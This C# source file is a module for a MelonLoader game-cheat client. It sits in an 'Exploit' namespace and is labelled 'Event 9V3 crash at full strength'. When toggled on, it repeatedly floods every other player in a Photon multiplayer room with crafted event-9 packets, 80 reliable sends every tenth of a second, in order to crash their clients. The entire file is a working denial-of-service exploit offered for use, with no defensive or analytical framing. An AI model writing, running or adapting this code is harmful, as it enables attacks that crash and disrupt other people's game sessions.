using Trinity.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using System;
using System.Collections;
using UnityEngine;
using Trinity.SDK;
namespace Trinity.Module.Exploit
{
    internal class Event9V3 : BaseModule
    {
        public Event9V3() : base("Event 9", "Event 9V3 crash at full strength", Main.Instance.EventQuickMenu, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(EventNine());
        }

        IEnumerator EventNine()
        {
            byte[] NullPayload = new byte[8];
            byte[] LocalPlayer = BitConverter.GetBytes(int.Parse($"{PlayerWrapper.LocalPlayer.GetActorNumber()}00001")); 
            Buffer.BlockCopy(LocalPlayer, 0, NullPayload, 0, 4);
            while (toggled)
            {
                for (int i = 0; i < 80; i++)
                {                  
                    PhotonExtensions.OpRaiseEvent(9, NullPayload, new Photon.Realtime.RaiseEventOptions{ field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others, field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache}, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
